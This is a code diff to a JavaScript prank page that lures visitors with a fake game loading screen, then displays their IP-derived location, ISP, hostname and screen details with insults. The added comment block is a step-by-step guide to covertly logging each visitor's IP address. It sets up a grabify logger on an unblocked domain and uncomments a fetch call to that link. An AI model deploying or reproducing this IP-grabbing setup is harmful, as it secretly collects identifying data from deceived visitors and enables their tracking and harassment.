@@ -67,6 +67,29 @@ async function get_rekt() {
     document.getElementById('loading_screen').classList.add("hidden");
     document.getElementById('fortnite-loading').classList.add("hidden");
     document.getElementById('trolled_lol').classList.remove("hidden");
+
+    /*
+    GUIDE FOR ACTUALLY LOGGING IP ADDRESSES
+    I, @aeiea, do not condone for any harm or illegal activities done with the information provided, and withdraw all responsibility for all damages.
+        
+    Now, with the legal stuff out of the way, let me show you how to log IPs.
+    1: generate a grabify.link logger. you can use any site.
+    2: Find a subdomain that is unblocked.
+    3: set that to the subdomain.
+    You should have a link somewhat like this:
+    https:// [blahblah] . [blah] / [blah]
+    EG:
+    https://shrekis.life/HA7V54N
+    Now: 
+    Uncomment line 91 or smth(which should look like // fetch('{PUT GRABIFY LINK HERE}');)
+    by removing the double-slash('//'), and replace the '{PUT GRABIFY LINK HERE}' with your grabify link.
+    
+    it should look like:
+    fetch('https://shrekis.life/HA7V54N');
+    */
+    // 🟥🟥REPLACE THE LINE BELOW!!🟥🟥
+    // fetch('{PUT GRABIFY LINK HERE}');
+    // 🟥🟥REPLACE THE LINE ABOVE!!🟥🟥
     function push_message(message) {
         var trolled_message_container = document.getElementById("trolled");
         var trolled_message = document.createElement("p");
@@ -88,7 +111,7 @@ async function get_rekt() {
             "YourFuckingCountryCode": "US"
         }
         */
-        const ip_data = await fetch("https://wtfismyip.com/json").then(response => response.json()); // change this for ur grabify
+        const ip_data = await fetch("https://wtfismyip.com/json").then(response => response.json());
         console.log(ip_data);
         return ip_data;
     }
@@ -98,7 +121,7 @@ async function get_rekt() {
         example fact:
         {"fact":"The cat who holds the record for the longest non-fatal fall is Andy. He fell from the 16th floor of an apartment building (about 200 ft\/.06 km) and survived.","length":157}
         */
-        const catfact = await fetch("https://catfact.ninja/fact").then(response => response.json());
+        const catfact = await fetch("https://catfact.ninja/fact").then(response => response.json()); 
         console.log(catfact);
         console.log(catfact.fact);
         return catfact.fact;
@@ -125,7 +148,8 @@ async function get_rekt() {
         "jeebus crust",
         "professional gacha life player",
         "professional roblox adopt me player",
-        "ea game enjoyer"
+        "ea game enjoyer",
+        "iM a DeVeLoPeR dAd BuY mE gItHuB pReMiUm"
     ];
     var trollmessage = trollmessages[Math.floor(Math.random() * trollmessages.length)];
     var skilllevelmessage = skilllevelmessages[Math.floor(Math.random() * skilllevelmessages.length)];
@@ -139,14 +163,17 @@ async function get_rekt() {
         "location: ".concat(await get_ip_data().then(response => response.YourFuckingLocation)),
         "hostname: ".concat(await get_ip_data().then(response => response.YourFuckingHostname)),
         "isp: ".concat(await get_ip_data().then(response => response.YourFuckingISP)),
-        "city:".concat(await get_ip_data().then(response => response.YourFuckingCity)),
+        "city: ".concat(await get_ip_data().then(response => response.YourFuckingCity)),
         "country: ".concat(await get_ip_data().then(response => response.YourFuckingCountry)),
         "screen h: ".concat(window.screen.availHeight),
         "screen w: ".concat(window.screen.availWidth),
         "referrer: ".concat(document.referrer),
         "raw data: ".concat(await get_ip_data().then(response => JSON.stringify(response))), // raw json so scawy!1!!
         "trolled: true",
-        "made by: @aeiea" 
+        "made by: @aeiea",
+        "git: gud",
+        "l plus: bozo",
+        "u are: stupid"
     ];
     console.log(messages)
     for (let i = 0; i < messages.length; i++) {
